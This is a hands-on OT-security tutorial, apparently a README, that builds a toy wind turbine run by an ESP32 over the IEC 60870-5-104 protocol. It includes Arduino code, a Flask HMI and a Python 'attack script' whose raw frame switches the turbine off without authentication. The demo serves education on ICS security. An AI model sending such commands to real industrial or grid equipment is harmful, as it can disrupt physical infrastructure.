# Hacking demo of a wind turbine using he IEC 60870-5-104 protocol
Working on OT security often involves a lot of talk about frameworks, network segmentation, monitoring and other controls. However, to better connect to the actual systems, its useful to get some hands-on experience with the actual protocols. For this demo, I obtained a Bricks windturbine (Lego was to expensive :)) and connected it to an ESP32. The ESP32 simulates a very simple operation, in this case an operator being able to remotely switch on and off the wind turbine. 

## Shoppinglist
The following items are required to build the demo

| ID | Item | URL |
|-----:|-----------|-----------|
|     1| ESP32    |https://www.amazon.nl/AZDelivery-ESP32-Development-compatibel-Inclusief/dp/B074RGW2VQ |
|     2| Windturbine bricks    | https://nl.aliexpress.com/item/1005006791312791.html |
|     3| Relais    | https://www.amazon.nl/dp/B07CNR7K9B?th=1 |
|     4| Chandler    | https://www.amazon.nl/UNITEC-Kroonluchter-12-polig-inzetbaar-transparant/dp/B007CWCQ74|
|     5| 9v Battery connector    | https://www.amazon.nl/dp/B08ZD7ZB8T |
|     6| 9v Battery     | https://www.amazon.nl/Duracell-Plus-MN1604-Alkaline-batterijen/dp/B00011PJDG |

## Wiring
When looking at the bricks cable, you find that the 4 metal connectors indicate: ground, a 9v line and two lines called c1 and c2 (used to control the direction). I figured that the easiest way for the demo is to connect 9v and GND directly to line c1 and c2.

As such, I cut the bricks line and connected a chandler (kroonluchter) for each of use (and to extend the wire a bit). During this process, I learned that the multimeter indicates the polarity while doing a measurement by showing the minus sign in front of the number (in case its reversed).

![Picture of polarity](https://raw.githubusercontent.com/JeroenSlobbe/Tutorials/main/LegoWindturbine/img/polarity.png?raw=true)

After this worked, I figured it would be easier to use a 9v battery and came op with the following setup:
![Picture of setup](https://raw.githubusercontent.com/JeroenSlobbe/Tutorials/main/LegoWindturbine/img/setup.png?raw=true)

Note that NO indicates Normal Open and NC indicates Normal Closed. By default, I want the wind turbine to work, so I picked NO.

## Software (Arduino)
After the wiring was complete, I started working on the software and found that Crisce implemented a PoC for the IEC 60870-5-104 protocol for the ESP32: https://github.com/Crisce/IEC60870-5-104. 
First, I downloaded the library as a .zip and added the library to the Arduino IDE:

![Picture of libs](https://raw.githubusercontent.com/JeroenSlobbe/Tutorials/main/LegoWindturbine/img/libs.png?raw=true)

Afterwards, I copied the code from: https://github.com/Crisce/IEC60870-5-104/tree/master/examples/Slave_Server_Demo and updated it, for the purpose of this demo.


```arduino
/*ESEMPIO IEC60870-5-104 SLAVE*/

#include <WiFi.h>
#include <IEC60870-5-104.h>

#define RELAY_PIN 25

//create the SERVER instance IEC60870-5-104
WiFiServer srv(2404); 
IEC104_SLAVE slave(&srv);

unsigned long lastSend=0;

void setup()
{
  Serial.begin(115200);
  WiFi.mode(WIFI_STA); 
  WiFi.begin("yourWiFiNetwork","changeme"); 
  pinMode(RELAY_PIN, OUTPUT);

  Serial.print("Trying to connect to WiFi");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println(); // Move to the next line once connected
  Serial.print("Program initialized and connected to WiFi. IP address: ");
  Serial.println(WiFi.localIP());
  digitalWrite(RELAY_PIN, HIGH);
  Serial.print("Windturbine started");
}

void loop()
{
  //------------------------------------------------------------"Reception of an SP or DP command.------------------------------------------------------------//
  // Note: SP = Single Point and DP = Double Point
  int messages = slave.available();

  for(int i=0; i<messages; i++)
  {
    // create support variables to read the buffer
    // CA = Common Address
    // IOA = Information Object Address
    byte type = 0; int ca = 0; long ioa = 0; long value = 0;

    //Reading the bufferr
    slave.read(&type,&ca,&ioa,&value);
    //Use the received data
    if (type == C_SC_NA_1) 
    {
      Serial.println("You have received a Single Point Command from C.A.:" + String(ca) + "-IOA:" + String(ioa) + " equal to " + String(value));
      if(value == 2)
      {
        digitalWrite(RELAY_PIN, HIGH);
        Serial.println("Windurbine set to ON");
      }
      else
      {
        digitalWrite(RELAY_PIN, LOW);
        Serial.println("Windurbine set to OFF");
      }
    } 

  }
}
```
## HMI and attack script
Luckily the protocol is well specified by [Berckhoff](https://infosys.beckhoff.com/english.php?content=../content/1033/tf6500_tc3_iec60870_5_10x/984444939.html&id=)
). Based on this, I was able to write two python scripts. One based on Flask, simulating an HMI that can enable / disable the turbine and the second one simulating the attacker in a terminal (for dramatic demo purposes).

```python
from flask import Flask, render_template, request
import socket

app = Flask(__name__)

# Define the server's IP and port
HOST = "192.168.2.32"  # Replace with your target IP
PORT = 2404            # Replace with your target port

@app.route('/')
def home():
    return render_template("hmi.html")

@app.route('/control', methods=['POST'])
def control_windturbine():
    action = request.form.get("action")  # Get the action from the form
    raw_message = b""  # Initialize raw message

    if action == "Enable":
        raw_message = b'\x68\x0e\x00\x00\x00\x00\x2D\x01\x03\x00\x32\x01\x00\x00\x00\x02'
    elif action == "Disable":
        raw_message = b'\x68\x0e\x00\x00\x00\x00\x2D\x01\x03\x00\x32\x01\x00\x00\x00\x01'

    try:
        # Create and connect the socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((HOST, PORT))
            client_socket.sendall(raw_message)
            print(f"Raw message sent: {raw_message}")
        message = f"Successfully sent: {action} command"
    except Exception as e:
        message = f"Failed to send command: {e}"
    
    return render_template("hmi.html", message=message)

if __name__ == '__main__':
    app.run(debug=True)
```
Finally, I created an attack script for the demo effect (and getting a better understanding of the protocol):

```python
import socket

# Define the server's IP and port
HOST = "192.168.2.32"  # Replace with your target IP
PORT = 2404            # Replace with your target port

# Create a TCP socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    try:
        # Connect to the server
        client_socket.connect((HOST, PORT))
        print(f"[x] Connected to {HOST}:{PORT}")

        # Construct the raw message (IEC 60870-5-104 format or custom format), specified via: https://infosys.beckhoff.com/english.php?content=../content/1033/tf6500_tc3_iec60870_5_10x/984444939.html&id=
        # The protocol is formatted: 
        # 1x[init byte: x68] 
        # 1x[length], Application Protocol Data Unit.. e=14
        # 4x [controlfield] 
        # 1x[typeID] 2D represents:C_SC_NA_1 -> https://github.com/Crisce/IEC60870-5-104/blob/master/src/IEC60870-5-104.h
        # ----
        # 1x [number of objects], in this case 1 is enough
        # 1x [cause of transmission], in this case 0x3, which is spontaniously: https://infosys.beckhoff.com/english.php?content=../content/1033/tf6500_tc3_iec60870_5_10x/983848075.html&id=
        # 1x [originator address]
        # 2x [ADSU address], in this case 50 (or 0x32 in hex)
        

        # 3x [IOA], Information object address fields = 1
        # 1x [command value] x02 = ON
        #raw_message = b'\x68\x0e\x00\x00\x00\x00\x2D\x01\x03\x00\x32\x01\x00\x00\x00\x02' enable the windturbine
        raw_message = b'\x68\x0e\x00\x00\x00\x00\x2D\x01\x03\x00\x32\x01\x00\x00\x00\x01' # disable the windturbine
        print("[x] sending payload: " + str(raw_message))

        # Send the raw message
        client_socket.sendall(raw_message)
        print("[x] payload delivered succesfull!")


    except Exception as e:
        print(f"Error: {e}")
```

![Picture of demo](https://raw.githubusercontent.com/JeroenSlobbe/Tutorials/main/LegoWindturbine/img/demo.png?raw=true)
